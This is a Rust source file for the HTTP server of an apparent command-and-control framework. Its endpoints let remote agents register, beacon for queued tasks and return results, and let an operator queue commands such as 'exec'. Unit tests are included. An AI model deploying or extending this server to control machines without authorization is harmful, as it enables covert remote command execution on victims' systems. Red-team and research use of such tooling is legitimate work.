use std::io::Read;
use std::sync::Arc;

use tiny_http::{Header, Method, Request, Response, Server};

use chamuko_protocol::{
    BeaconRequest, BeaconResponse, RegisterRequest, RegisterResponse, ResultsRequest,
};

use crate::state::State;

const JSON: &str = "application/json";
const MAX_BODY_BYTES: u64 = 1024 * 1024;
const WORKERS: usize = 4;

pub struct Options {
    pub listen: String,
    pub token: Option<String>,
}

pub fn run(state: Arc<std::sync::Mutex<State>>, options: &Options) -> std::io::Result<()> {
    let server = Server::http(&options.listen)
        .map_err(|e| std::io::Error::other(e.to_string()))?;
    eprintln!("[c2] listening on http://{}", options.listen);
    if options.token.is_none() {
        eprintln!("[c2] warning: no auth token configured; the API is unauthenticated");
    }

    let server = Arc::new(server);
    let token = Arc::new(options.token.clone());

    let mut workers = Vec::with_capacity(WORKERS);
    for _ in 0..WORKERS {
        let server = Arc::clone(&server);
        let state = Arc::clone(&state);
        let token = Arc::clone(&token);
        workers.push(std::thread::spawn(move || {
            while let Ok(request) = server.recv() {
                serve(state.clone(), token.as_deref(), request);
            }
        }));
    }

    for worker in workers {
        let _ = worker.join();
    }
    Ok(())
}

fn serve(state: Arc<std::sync::Mutex<State>>, token: Option<&str>, mut request: Request) {
    let method = request.method().clone();
    let url = request.url().to_string();
    let path = path_of(&url);

    if !authorized(token, &request) {
        let _ = respond(request, 401, json_error("unauthorized"));
        return;
    }

    let body = match read_body(&mut request) {
        Ok(body) => body,
        Err(status) => {
            let message = if status == 413 {
                "request body too large"
            } else {
                "could not read request body"
            };
            let _ = respond(request, status, json_error(message));
            return;
        }
    };

    let (status, response_body) = handle(&state, &method, path, &body);
    let _ = respond(request, status, response_body);
}

/// Routes match on the path only; query strings are ignored.
fn path_of(url: &str) -> &str {
    url.split('?').next().unwrap_or("")
}

fn authorized(token: Option<&str>, request: &Request) -> bool {
    let Some(expected) = token else {
        return true;
    };
    if path_of(request.url()) == "/health" {
        return true;
    }
    let presented = request
        .headers()
        .iter()
        .find(|h| h.field.equiv("Authorization"))
        .map(|h| h.value.as_str().trim())
        .and_then(|value| value.strip_prefix("Bearer ").or_else(|| value.strip_prefix("bearer ")));
    match presented {
        Some(presented) => constant_time_eq(presented.as_bytes(), expected.as_bytes()),
        None => false,
    }
}

fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    a.iter().zip(b).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

fn read_body(request: &mut Request) -> Result<String, i32> {
    if request.body_length().is_some_and(|len| len as u64 > MAX_BODY_BYTES) {
        return Err(413);
    }
    let mut body = String::new();
    request
        .as_reader()
        .take(MAX_BODY_BYTES + 1)
        .read_to_string(&mut body)
        .map_err(|_| 400)?;
    if body.len() as u64 > MAX_BODY_BYTES {
        return Err(413);
    }
    Ok(body)
}

fn respond(request: Request, status: i32, body: String) -> std::io::Result<()> {
    let header = Header::from_bytes(&b"Content-Type"[..], JSON.as_bytes()).expect("static header");
    request.respond(
        Response::from_string(body)
            .with_status_code(status)
            .with_header(header),
    )
}

fn handle(
    state: &Arc<std::sync::Mutex<State>>,
    method: &Method,
    path: &str,
    body: &str,
) -> (i32, String) {
    match (method, path) {
        (Method::Post, "/register") => handle_register(state, body),
        (Method::Post, "/beacon") => handle_beacon(state, body),
        (Method::Post, "/results") => handle_results(state, body),
        (Method::Post, "/enqueue") => handle_enqueue(state, body),
        (Method::Get, "/agents") => handle_agents(state),
        (Method::Get, "/health") => (200, r#"{"status":"ok"}"#.to_string()),
        _ => (404, json_error("not found")),
    }
}

const DEFAULT_SLEEP: u64 = 5;
const DEFAULT_JITTER: u64 = 2;

fn handle_register(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
    let req: RegisterRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_error(&e.to_string())),
    };
    let sleep = req.sleep.unwrap_or(DEFAULT_SLEEP);
    let jitter = req.jitter.unwrap_or(DEFAULT_JITTER);
    let id = state
        .lock()
        .unwrap()
        .register_agent(req.agent, sleep, jitter);
    eprintln!("[c2] agent registered: {id} (sleep={sleep}s jitter={jitter}s)");
    let resp = RegisterResponse {
        id,
        sleep,
        jitter,
    };
    (200, json(&resp))
}

fn handle_beacon(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
    let req: BeaconRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_error(&e.to_string())),
    };
    let Some((tasks, sleep, jitter)) = state.lock().unwrap().drain_tasks(&req.id) else {
        return (404, json_error("unknown agent"));
    };
    (
        200,
        json(&BeaconResponse {
            tasks,
            sleep: Some(sleep),
            jitter: Some(jitter),
        }),
    )
}

fn handle_results(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
    let req: ResultsRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_error(&e.to_string())),
    };
    if state
        .lock()
        .unwrap()
        .store_results(&req.id, req.results)
        .is_none()
    {
        return (404, json_error("unknown agent"));
    }
    (200, r#"{"status":"ok"}"#.to_string())
}

#[derive(serde::Deserialize)]
struct EnqueueRequest {
    id: String,
    command: String,
    #[serde(default)]
    args: Vec<String>,
}

fn handle_enqueue(state: &Arc<std::sync::Mutex<State>>, body: &str) -> (i32, String) {
    let req: EnqueueRequest = match serde_json::from_str(body) {
        Ok(r) => r,
        Err(e) => return (400, json_error(&e.to_string())),
    };
    let task_id = state
        .lock()
        .unwrap()
        .enqueue_task(&req.id, req.command, req.args);
    match task_id {
        Some(id) => (200, json(&serde_json::json!({ "task_id": id }))),
        None => (404, json_error("unknown agent")),
    }
}

fn handle_agents(state: &Arc<std::sync::Mutex<State>>) -> (i32, String) {
    let s = state.lock().unwrap();
    let mut out = Vec::new();
    for id in s.agent_ids() {
        let Some(entry) = s.get(&id) else { continue };
        out.push(serde_json::json!({
            "id": id,
            "name": entry.info.name,
            "hostname": entry.info.hostname,
            "username": entry.info.username,
            "os": entry.info.os,
            "arch": entry.info.arch,
            "sleep": entry.sleep,
            "jitter": entry.jitter,
            "last_seen": entry.last_seen,
            "pending": entry.pending.len(),
            "results": entry.results.len(),
        }));
    }
    (200, json(&out))
}

fn json<T: serde::Serialize>(value: &T) -> String {
    serde_json::to_string(value).unwrap_or_else(|_| json_error("serialization failed"))
}

fn json_error(message: &str) -> String {
    json(&serde_json::json!({ "error": message }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    fn state() -> Arc<Mutex<State>> {
        Arc::new(Mutex::new(State::new()))
    }

    fn post(path: &str, body: &str) -> (i32, String) {
        handle(&state(), &Method::Post, path, body)
    }

    #[test]
    fn register_echoes_requested_interval() {
        let state = state();
        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1},"sleep":11,"jitter":4}"#;
        let (status, response) = handle(&state, &Method::Post, "/register", body);
        assert_eq!(status, 200);
        let parsed: RegisterResponse = serde_json::from_str(&response).unwrap();
        assert_eq!((parsed.sleep, parsed.jitter), (11, 4));
    }

    #[test]
    fn register_defaults_when_interval_missing() {
        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}}"#;
        let (status, response) = post("/register", body);
        assert_eq!(status, 200);
        let parsed: RegisterResponse = serde_json::from_str(&response).unwrap();
        assert_eq!((parsed.sleep, parsed.jitter), (DEFAULT_SLEEP, DEFAULT_JITTER));
    }

    #[test]
    fn beacon_returns_404_for_unknown_agent() {
        let (status, response) = post("/beacon", r#"{"id":"ghost"}"#);
        assert_eq!(status, 404);
        assert!(response.contains("unknown agent"));
    }

    #[test]
    fn beacon_reports_configured_interval() {
        let state = state();
        let register = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1},"sleep":9,"jitter":1}"#;
        let (_, response) = handle(&state, &Method::Post, "/register", register);
        let id: RegisterResponse = serde_json::from_str(&response).unwrap();
        let (status, response) = handle(
            &state,
            &Method::Post,
            "/beacon",
            &format!(r#"{{"id":"{}"}}"#, id.id),
        );
        assert_eq!(status, 200);
        let parsed: BeaconResponse = serde_json::from_str(&response).unwrap();
        assert_eq!((parsed.sleep, parsed.jitter), (Some(9), Some(1)));
    }

    #[test]
    fn error_bodies_are_valid_json() {
        let (status, response) = post("/register", "not json");
        assert_eq!(status, 400);
        let parsed: serde_json::Value = serde_json::from_str(&response).expect("valid json");
        assert!(parsed["error"].is_string());
    }

    #[test]
    fn error_bodies_escape_embedded_quotes_and_backslashes() {
        let body = r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":"a\"b\\"}}"#;
        let (status, response) = post("/register", body);
        assert_eq!(status, 400);
        let parsed: serde_json::Value = serde_json::from_str(&response).expect("valid json");
        assert!(parsed["error"].as_str().unwrap().contains("invalid type"));
    }

    #[test]
    fn unknown_routes_are_404() {
        let state = state();
        assert_eq!(handle(&state, &Method::Get, "/nope", "").0, 404);
        assert_eq!(handle(&state, &Method::Get, "/agents", "").0, 200);
    }

    #[test]
    fn query_strings_are_stripped_before_routing() {
        assert_eq!(path_of("/agents?x=1"), "/agents");
        assert_eq!(path_of("/health"), "/health");
    }

    #[test]
    fn enqueue_targets_registered_agents_only() {
        let state = state();
        let (_, response) = handle(
            &state,
            &Method::Post,
            "/register",
            r#"{"agent":{"hostname":"h","username":"u","os":"linux","arch":"x86_64","pid":1}}"#,
        );
        let id: RegisterResponse = serde_json::from_str(&response).unwrap();
        let body = format!(r#"{{"id":"{}","command":"exec","args":["id"]}}"#, id.id);
        assert_eq!(handle(&state, &Method::Post, "/enqueue", &body).0, 200);
        let ghost = r#"{"id":"ghost","command":"exec"}"#;
        assert_eq!(handle(&state, &Method::Post, "/enqueue", ghost).0, 404);
    }

    #[test]
    fn constant_time_eq_matches_semantics_of_eq() {
        assert!(constant_time_eq(b"secret", b"secret"));
        assert!(!constant_time_eq(b"secret", b"secreT"));
        assert!(!constant_time_eq(b"secret", b"secre"));
    }
}
